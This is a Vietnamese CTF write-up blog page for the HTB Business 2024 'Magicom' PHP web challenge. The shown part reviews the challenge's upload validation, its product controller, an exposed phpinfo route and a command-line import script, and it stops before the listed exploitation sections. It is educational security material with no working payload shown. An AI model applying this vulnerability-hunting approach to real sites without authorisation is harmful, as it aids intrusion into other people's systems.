@@ -1,0 +1,374 @@
+<!doctype html><html lang=en-us dir=ltr><head><meta charset=utf-8><meta name=viewport content='width=device-width,initial-scale=1'><meta name=description content="Trong giải HTB Business này, mình tham gia vào làm challenge Omniwatch và Magicom cùng với các teammates trong câu lạc bộ. Chúng mình đã solve được challenge Omniwatch, còn Magicom thì gần như đã làm được, chỉ thiếu một bước nữa nhưng chúng mình đã đi sai hướng và không tìm ra cách giải kịp giờ nên không kịp solve. Mình muốn viết là để chia sẻ lại quá trình giải challenge của mình và các teammates, và cũng như là hướng giải đúng đắn để solve challenge. Mình đã tham khảo official solution và nhận ra anh em đã đi đúng gần hết các bước, chỉ có bước đầu là chưa ra, nên bước đầu của mình sẽ đi theo con đường của official write up. Mình sẽ tiến hành vào khai thác tại local vì mình viết write up này hơi muộn nên không deploy trên server kịp=))\n"><title>HTB Business CTF 2024 Write Up - Magicom</title><link rel=canonical href=https://kev1n1203.github.io/p/htb-business-2024/><link rel=stylesheet href=/scss/style.min.43579eb5b8b82fae543c237cb1e0ed21184587621bafe6e42941bbb438644f4a.css><meta property='og:title' content="HTB Business CTF 2024 Write Up - Magicom"><meta property='og:description' content="Trong giải HTB Business này, mình tham gia vào làm challenge Omniwatch và Magicom cùng với các teammates trong câu lạc bộ. Chúng mình đã solve được challenge Omniwatch, còn Magicom thì gần như đã làm được, chỉ thiếu một bước nữa nhưng chúng mình đã đi sai hướng và không tìm ra cách giải kịp giờ nên không kịp solve. Mình muốn viết là để chia sẻ lại quá trình giải challenge của mình và các teammates, và cũng như là hướng giải đúng đắn để solve challenge. Mình đã tham khảo official solution và nhận ra anh em đã đi đúng gần hết các bước, chỉ có bước đầu là chưa ra, nên bước đầu của mình sẽ đi theo con đường của official write up. Mình sẽ tiến hành vào khai thác tại local vì mình viết write up này hơi muộn nên không deploy trên server kịp=))\n"><meta property='og:url' content='https://kev1n1203.github.io/p/htb-business-2024/'><meta property='og:site_name' content="kev1n's Blog"><meta property='og:type' content='article'><meta property='article:section' content='Post'><meta property='article:tag' content='CTF'><meta property='article:published_time' content='2024-05-25T21:42:04+00:00'><meta property='article:modified_time' content='2024-05-25T21:42:04+00:00'><meta name=twitter:title content="HTB Business CTF 2024 Write Up - Magicom"><meta name=twitter:description content="Trong giải HTB Business này, mình tham gia vào làm challenge Omniwatch và Magicom cùng với các teammates trong câu lạc bộ. Chúng mình đã solve được challenge Omniwatch, còn Magicom thì gần như đã làm được, chỉ thiếu một bước nữa nhưng chúng mình đã đi sai hướng và không tìm ra cách giải kịp giờ nên không kịp solve. Mình muốn viết là để chia sẻ lại quá trình giải challenge của mình và các teammates, và cũng như là hướng giải đúng đắn để solve challenge. Mình đã tham khảo official solution và nhận ra anh em đã đi đúng gần hết các bước, chỉ có bước đầu là chưa ra, nên bước đầu của mình sẽ đi theo con đường của official write up. Mình sẽ tiến hành vào khai thác tại local vì mình viết write up này hơi muộn nên không deploy trên server kịp=))\n"><link rel="shortcut icon" href=/favicon.png></head><body class=article-page><script>(function(){const e="StackColorScheme";localStorage.getItem(e)||localStorage.setItem(e,"auto")})()</script><script>(function(){const t="StackColorScheme",e=localStorage.getItem(t),n=window.matchMedia("(prefers-color-scheme: dark)").matches===!0;e=="dark"||e==="auto"&&n?document.documentElement.dataset.scheme="dark":document.documentElement.dataset.scheme="light"})()</script><div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky"><button class="hamburger hamburger--spin" type=button id=toggle-menu aria-label="Toggle Menu">
+<span class=hamburger-box><span class=hamburger-inner></span></span></button><header><figure class=site-avatar><a href=/><img src=/img/avatar_hu_80bb896afdf080a5.jpg width=300 height=300 class=site-logo loading=lazy alt=Avatar></a></figure><div class=site-meta><h1 class=site-name><a href=/>kev1n's Blog</a></h1><h2 class=site-description>Trung Hậu - Thành viên ăn hại tại KCSC</h2></div></header><ol class=menu-social><li><a href=https://github.com/kev1n1203 target=_blank title=GitHub rel=me><svg class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M9 19c-4.3 1.4-4.3-2.5-6-3m12 5v-3.5c0-1 .1-1.4-.5-2 2.8-.3 5.5-1.4 5.5-6a4.6 4.6.0 00-1.3-3.2 4.2 4.2.0 00-.1-3.2s-1.1-.3-3.5 1.3a12.3 12.3.0 00-6.2.0C6.5 2.8 5.4 3.1 5.4 3.1a4.2 4.2.0 00-.1 3.2A4.6 4.6.0 004 9.5c0 4.6 2.7 5.7 5.5 6-.6.6-.6 1.2-.5 2V21"/></svg></a></li><li><a href=https://x.com/kev1n1203 target=_blank title=Twitter rel=me><svg class="icon icon-tabler icon-tabler-brand-twitter" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M22 4.01c-1 .49-1.98.689-3 .99-1.121-1.265-2.783-1.335-4.38-.737S11.977 6.323 12 8v1c-3.245.083-6.135-1.395-8-4 0 0-4.182 7.433 4 11-1.872 1.247-3.739 2.088-6 2 3.308 1.803 6.913 2.423 10.034 1.517 3.58-1.04 6.522-3.723 7.651-7.742a13.84 13.84.0 00.497-3.753C20.18 7.773 21.692 5.25 22 4.009z"/></svg></a></li></ol><ol class=menu id=main-menu><li><a href=/><svg class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><polyline points="5 12 3 12 12 3 21 12 19 12"/><path d="M5 12v7a2 2 0 002 2h10a2 2 0 002-2v-7"/><path d="M9 21v-6a2 2 0 012-2h2a2 2 0 012 2v6"/></svg>
+<span>Home</span></a></li><li><a href=/archives/><svg class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><rect x="3" y="4" width="18" height="4" rx="2"/><path d="M5 8v10a2 2 0 002 2h10a2 2 0 002-2V8"/><line x1="10" y1="12" x2="14" y2="12"/></svg>
+<span>Archives</span></a></li><li><a href=/search/><svg class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="10" cy="10" r="7"/><line x1="21" y1="21" x2="15" y2="15"/></svg>
+<span>Search</span></a></li><li><a href=/links/><svg class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M10 14a3.5 3.5.0 005 0l4-4a3.5 3.5.0 00-5-5l-.5.5"/><path d="M14 10a3.5 3.5.0 00-5 0l-4 4a3.5 3.5.0 005 5l.5-.5"/></svg>
+<span>Links</span></a></li><li class=menu-bottom-section><ol class=menu><li id=dark-mode-toggle><svg class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="8" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
+<svg class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="16" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
+<span>Dark Mode</span></li></ol></li></ol></aside><aside class="sidebar right-sidebar sticky"><section class="widget archives"><div class=widget-icon><svg class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><line x1="5" y1="9" x2="19" y2="9"/><line x1="5" y1="15" x2="19" y2="15"/><line x1="11" y1="4" x2="7" y2="20"/><line x1="17" y1="4" x2="13" y2="20"/></svg></div><h2 class="widget-title section-title">Table of contents</h2><div class=widget--toc><nav id=TableOfContents><ol><li><a href=#preface>Preface</a></li><li><a href=#phân-tích-source-code>Phân Tích Source Code</a><ol><li><a href=#config>Config</a></li><li><a href=#source-code>Source Code</a></li></ol></li><li><a href=#khai-thác>Khai Thác</a><ol><li><a href=#command-injection-in-cliphp>Command Injection in cli.php</a></li><li><a href=#race-condition>Race Condition??</a></li><li><a href=#the-right-path-phar-deserialization>The right path: Phar Deserialization</a></li><li><a href=#final-exploit>Final Exploit</a></li></ol></li></ol></nav></div></section></aside><main class="main full-width"><article class=main-article><header class=article-header><div class=article-details><div class=article-title-wrapper><h2 class=article-title><a href=/p/htb-business-2024/>HTB Business CTF 2024 Write Up - Magicom</a></h2></div><footer class=article-time><div><svg class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M11.795 21H5a2 2 0 01-2-2V7a2 2 0 012-2h12a2 2 0 012 2v4"/><circle cx="18" cy="18" r="4"/><path d="M15 3v4"/><path d="M7 3v4"/><path d="M3 11h16"/><path d="M18 16.496V18l1 1"/></svg>
+<time class=article-time--published datetime=2024-05-25T21:42:04Z>May 25, 2024</time></div><div><svg class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><polyline points="12 7 12 12 15 15"/></svg>
+<time class=article-time--reading>12 minute read</time></div></footer></div></header><section class=article-content><p>Trong giải HTB Business này, mình tham gia vào làm challenge Omniwatch và Magicom cùng với các teammates trong câu lạc bộ. Chúng mình đã solve được challenge Omniwatch, còn Magicom thì gần như đã làm được, chỉ thiếu một bước nữa nhưng chúng mình đã đi sai hướng và không tìm ra cách giải kịp giờ nên không kịp solve.
+Mình muốn viết là để chia sẻ lại quá trình giải challenge của mình và các teammates, và cũng như là hướng giải đúng đắn để solve challenge. Mình đã tham khảo official solution và nhận ra anh em đã đi đúng gần hết các bước, chỉ có bước đầu là chưa ra, nên bước đầu của mình sẽ đi theo con đường của official write up. Mình sẽ tiến hành vào khai thác tại local vì mình viết write up này hơi muộn nên không deploy trên server kịp=))</p><h2 id=preface>Preface</h2><p>Challenge xuất hiện dưới dạng một website có chức năng xem sản phẩm và thêm sản phẩm, người dùng có thể thêm sản phẩm và một số các thông tin của sản phẩm, trong đó là phần ảnh minh họa:
+<img src=https://hackmd.io/_uploads/BkhzXty40.png loading=lazy alt=image><br>Đã được add product tùy theo ý mình mà còn unauthen, mình ban đầu cũng nghĩ upload php để RCE:
+<img src=https://hackmd.io/_uploads/Sya5yqJN0.png loading=lazy alt=image><br></p><h2 id=phân-tích-source-code>Phân Tích Source Code</h2><h3 id=config>Config</h3><p>Ngay sau khi mình mở source của challenge mình đã thấy đây chắc chắn không phải là một challenge upload file PHP thông thường. Vì challenge cung cấp cả phpinfo tại /info, và file php.ini, mình nhìn sơ qua qua thì cũng chưa có gì bất thường, nhưng chắc chắn là mình cần phải dùng đến chúng.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$router-&gt;get(&#39;/info&#39;, function(){
+</span></span><span class=line><span class=cl>    return phpinfo();
+</span></span><span class=line><span class=cl>});
+</span></span></code></pre></td></tr></table></div></div><p><img src=https://hackmd.io/_uploads/S1fCHcy4R.png loading=lazy alt=image><br></p><h3 id=source-code>Source Code</h3><p>Challenge đã quy định những route có thể truy cập tại website trong index.php:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$router = new Router;
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>$router-&gt;get(&#39;/&#39;, &#39;HomeController@index&#39;);
+</span></span><span class=line><span class=cl>$router-&gt;get(&#39;/home&#39;, &#39;HomeController@index&#39;);
+</span></span><span class=line><span class=cl>$router-&gt;get(&#39;/product&#39;, &#39;ProductViewController@index&#39;);
+</span></span><span class=line><span class=cl>$router-&gt;get(&#39;/addProduct&#39;, &#39;AddProductController@index&#39;);
+</span></span><span class=line><span class=cl>$router-&gt;post(&#39;/addProduct&#39;, &#39;AddProductController@add&#39;);
+</span></span><span class=line><span class=cl>$router-&gt;get(&#39;/info&#39;, function(){
+</span></span><span class=line><span class=cl>    return phpinfo();
+</span></span><span class=line><span class=cl>});
+</span></span></code></pre></td></tr></table></div></div><p>Mình ngay lập tức đi tìm kiếm những đoạn code xử lý upload file:</p><ol><li>models/ImageModel.php</li></ol><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=k>class</span> <span class=n>ImageModel</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=n>public</span> <span class=n>function</span> <span class=n>__construct</span><span class=p>(</span><span class=o>$</span><span class=n>file</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=o>$</span><span class=n>this</span><span class=o>-&gt;</span><span class=n>file</span> <span class=o>=</span> <span class=o>$</span><span class=n>file</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=n>public</span> <span class=n>function</span> <span class=n>isValid</span><span class=p>()</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>        <span class=o>$</span><span class=n>allowed_extensions</span> <span class=o>=</span> <span class=p>[</span><span class=s2>&#34;jpeg&#34;</span><span class=p>,</span> <span class=s2>&#34;jpg&#34;</span><span class=p>,</span> <span class=s2>&#34;png&#34;</span><span class=p>];</span>
+</span></span><span class=line><span class=cl>        <span class=o>$</span><span class=n>file_extension</span> <span class=o>=</span> <span class=n>pathinfo</span><span class=p>(</span><span class=o>$</span><span class=n>this</span><span class=o>-&gt;</span><span class=n>file</span><span class=p>[</span><span class=s2>&#34;name&#34;</span><span class=p>],</span> <span class=n>PATHINFO_EXTENSION</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>        <span class=n>print_r</span><span class=p>(</span><span class=o>$</span><span class=n>this</span><span class=o>-&gt;</span><span class=n>file</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=n>in_array</span><span class=p>(</span><span class=o>$</span><span class=n>file_extension</span><span class=p>,</span> <span class=o>$</span><span class=n>allowed_extensions</span><span class=p>))</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=bp>false</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>        <span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>        <span class=o>$</span><span class=n>allowed_mime_types</span> <span class=o>=</span> <span class=p>[</span><span class=s2>&#34;image/jpeg&#34;</span><span class=p>,</span> <span class=s2>&#34;image/jpg&#34;</span><span class=p>,</span> <span class=s2>&#34;image/png&#34;</span><span class=p>];</span>
+</span></span><span class=line><span class=cl>        <span class=o>$</span><span class=n>mime_type</span> <span class=o>=</span> <span class=n>mime_content_type</span><span class=p>(</span><span class=o>$</span><span class=n>this</span><span class=o>-&gt;</span><span class=n>file</span><span class=p>[</span><span class=s1>&#39;tmp_name&#39;</span><span class=p>]);</span>
+</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=n>in_array</span><span class=p>(</span><span class=o>$</span><span class=n>mime_type</span><span class=p>,</span> <span class=o>$</span><span class=n>allowed_mime_types</span><span class=p>))</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=bp>false</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>        <span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=n>getimagesize</span><span class=p>(</span><span class=o>$</span><span class=n>this</span><span class=o>-&gt;</span><span class=n>file</span><span class=p>[</span><span class=s1>&#39;tmp_name&#39;</span><span class=p>]))</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=bp>false</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>        <span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=bp>true</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span></code></pre></td></tr></table></div></div><ul><li>Class này được gọi trong request xử lý file nên mình muốn nói về nó trước. Quá trình kiểm duyệt file được gói gọn trong hàm isValid()</li><li>File extension được lấy bằng PATHINFO_EXTENSION và được whitelist => loại bỏ khả năng bypass upload file php bypass bằng extension file</li><li>Sử dụng print_r để in ra mảng thông tin của file đó theo dạng <code>[key] => value</code></li><li>Sau khi check extension class tiếp tục check mime types bằng cách whitelist, và cuối cùng là check size bằng getimagesize. Mình gần như không thấy cơ hội nào để upload file PHP mà RCE được, nhưng đoạn print_r thông tin khá thú vị, vì nó chứa giá trị <code>tmp_name</code></li></ul><ol start=2><li>controllers/AddProductController.php</li></ol><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=n>public</span> <span class=n>function</span> <span class=n>add</span><span class=p>()</span> 
+</span></span><span class=line><span class=cl><span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=n>empty</span><span class=p>(</span><span class=o>$</span><span class=n>_FILES</span><span class=p>[</span><span class=s1>&#39;image&#39;</span><span class=p>])</span> <span class=o>||</span> <span class=n>empty</span><span class=p>(</span><span class=o>$</span><span class=n>_POST</span><span class=p>[</span><span class=s1>&#39;title&#39;</span><span class=p>])</span> <span class=o>||</span> <span class=n>empty</span><span class=p>(</span><span class=o>$</span><span class=n>_POST</span><span class=p>[</span><span class=s1>&#39;description&#39;</span><span class=p>]))</span>
+</span></span><span class=line><span class=cl>    <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=n>header</span><span class=p>(</span><span class=s1>&#39;Location: /addProduct?error=1&amp;message=Fields can</span><span class=se>\&#39;</span><span class=s1>t be empty.&#39;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>        <span class=n>exit</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=o>$</span><span class=n>title</span> <span class=o>=</span> <span class=o>$</span><span class=n>_POST</span><span class=p>[</span><span class=s2>&#34;title&#34;</span><span class=p>];</span>
+</span></span><span class=line><span class=cl>    <span class=o>$</span><span class=n>description</span> <span class=o>=</span> <span class=o>$</span><span class=n>_POST</span><span class=p>[</span><span class=s2>&#34;description&#34;</span><span class=p>];</span>
+</span></span><span class=line><span class=cl>    <span class=o>$</span><span class=n>image</span> <span class=o>=</span> <span class=n>new</span> <span class=n>ImageModel</span><span class=p>(</span><span class=o>$</span><span class=n>_FILES</span><span class=p>[</span><span class=s2>&#34;image&#34;</span><span class=p>]);</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=k>if</span><span class=p>(</span><span class=o>$</span><span class=n>image</span><span class=o>-&gt;</span><span class=n>isValid</span><span class=p>())</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>        <span class=o>$</span><span class=n>mimeType</span> <span class=o>=</span> <span class=n>mime_content_type</span><span class=p>(</span><span class=o>$</span><span class=n>_FILES</span><span class=p>[</span><span class=s2>&#34;image&#34;</span><span class=p>][</span><span class=s1>&#39;tmp_name&#39;</span><span class=p>]);</span>
+</span></span><span class=line><span class=cl>        <span class=o>$</span><span class=n>extention</span> <span class=o>=</span> <span class=n>explode</span><span class=p>(</span><span class=s1>&#39;/&#39;</span><span class=p>,</span> <span class=o>$</span><span class=n>mimeType</span><span class=p>)[</span><span class=mi>1</span><span class=p>];</span>
+</span></span><span class=line><span class=cl>        <span class=o>$</span><span class=n>randomName</span> <span class=o>=</span> <span class=n>bin2hex</span><span class=p>(</span><span class=n>random_bytes</span><span class=p>(</span><span class=mi>8</span><span class=p>));</span>
+</span></span><span class=line><span class=cl>        <span class=o>$</span><span class=n>secureFilename</span> <span class=o>=</span> <span class=s2>&#34;$randomName.$extention&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>        <span class=k>if</span><span class=p>(</span><span class=n>move_uploaded_file</span><span class=p>(</span><span class=o>$</span><span class=n>_FILES</span><span class=p>[</span><span class=s2>&#34;image&#34;</span><span class=p>][</span><span class=s2>&#34;tmp_name&#34;</span><span class=p>],</span> <span class=s2>&#34;uploads/$secureFilename&#34;</span><span class=p>))</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>            <span class=o>$</span><span class=n>this</span><span class=o>-&gt;</span><span class=n>product</span><span class=o>-&gt;</span><span class=n>insert</span><span class=p>(</span><span class=o>$</span><span class=n>title</span><span class=p>,</span> <span class=o>$</span><span class=n>description</span><span class=p>,</span> <span class=s2>&#34;uploads/$secureFilename&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>            <span class=n>header</span><span class=p>(</span><span class=s1>&#39;Location: /addProduct?error=0&amp;message=Product added successfully.&#39;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>            <span class=n>exit</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>        <span class=p>}</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=n>header</span><span class=p>(</span><span class=s1>&#39;Location: /addProduct?error=1&amp;message=Not a valid image.&#39;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>        <span class=n>exit</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span></code></pre></td></tr></table></div></div><ul><li>Nếu có dấu hiệu upload file, webserver đưa nó vào class ImageModel để sử dụng hàm isValid để check, nếu như return true thì lấy extension file bằng cách bổ đôi cái mime type mà lấy cái thứ 2 -> đoạn này khá lỏng lẻo vì giá trị đó mình control được nhưng đằng trước là whitelist nên đành chịu</li><li>Gắn file extension vừa lấy được với 16 ký tự random được gen bằng <code>bin2hex(random_bytes(8))</code>, move vào thư mục uploads và trả về thông báo và lỗi nếu có.</li></ul><p>Riêng đoạn code check valid tại class ImageModel đã làm cho mình không tin tưởng vào việc có thể bypass upload file PHP nữa, mặc dù đoạn lấy extension ở controller khá ngon nhưng hàm valid lại quá chặt nên mình đi đọc những file khác vì còn rất nhiều thứ chưa được sử dụng.
+Đáng chú ý nhất chắc chắn là file cli/cli.php, nó vốn được dùng để import file sql chứa các sản phẩm mặc định vào database bằng command line, sau đó file sql sẽ bị xóa:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>php /www/cli/cli.php -c /www/cli/conf.xml -m import -f /www/products.sql
+</span></span><span class=line><span class=cl>rm /www/products.sql
+</span></span></code></pre></td></tr></table></div></div><p>Vì pha import này quá cồng kềnh, chả có lí do gì phải làm hẳn 1 file php chỉ để import 1 file sql vào, nên mình chắc chắn sẽ khai thác từ file này ra:
+Ngay từ đầu file đã đánh phủ đầu bằng việc check xem file có được thực thi thông qua dòng lệnh hay không:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>if (!isset( $_SERVER[&#39;argv&#39;], $_SERVER[&#39;argc&#39;] ) || !$_SERVER[&#39;argc&#39;]) {
+</span></span><span class=line><span class=cl>    die(&#34;This script must be run from the command line!&#34;);
+</span></span><span class=line><span class=cl>}
+</span></span></code></pre></td></tr></table></div></div><p><code>argv</code> và <code>argc</code> là 2 biến siêu toàn cục, trong đó <code>argv</code> sẽ là một mảng lưu giá trị của các tham số truyền được truyền vào file php dưới dạng mảng <code>[số thứ tự] => value</code>. Còn <code>argc</code> sẽ chứa số các tham số được truyền vào.
+Ví dụ như với câu lệnh chạy file cli.php như ở trên, thì giá trị của <code>argv</code> sẽ có dạng như sau:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span><span class=lnt>8
+</span><span class=lnt>9
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>Array
+</span></span><span class=line><span class=cl>(
+</span></span><span class=line><span class=cl>    [0] =&gt; -c
+</span></span><span class=line><span class=cl>    [1] =&gt; /www/cli/conf.xml
+</span></span><span class=line><span class=cl>    [2] =&gt; -m
+</span></span><span class=line><span class=cl>    [3] =&gt; import
+</span></span><span class=line><span class=cl>    [4] =&gt; -f
+</span></span><span class=line><span class=cl>    [5] =&gt; /www/products.sql
+</span></span><span class=line><span class=cl>)
+</span></span></code></pre></td></tr></table></div></div><p>Còn <code>argc</code> sẽ mang giá trị là 6, ứng với số tham số truyền vào
+File có thể gồm 3 tham số truyền vào:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>-c (--config): Truyền vào đường dẫn tuyệt đối đến file config ở định dạng xml
+</span></span><span class=line><span class=cl>-m (--method): Tên phương thức hành động tương ứng, gồm có import, backup và healthcheck
+</span></span><span class=line><span class=cl>-f (--filename): Sử dụng khi dùng method import, truyền vào tên file để import dữ liệu vào database
+</span></span></code></pre></td></tr></table></div></div><p>Tham số <code>-c</code> khá quan trọng, giá trị này sẽ được check xem có phải là thư mục hay không, nếu có sẽ chèn thêm <code>config.xml</code> trước rồi return đệ quy để tiếp tục kiểm tra, tiếp đó kiểm tra xem file có tồn tại, và file đó thêm <code>.xml</code> có tồn tại hay không, nếu 1 trong 2 tồn tại thì return về giá trị đó.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
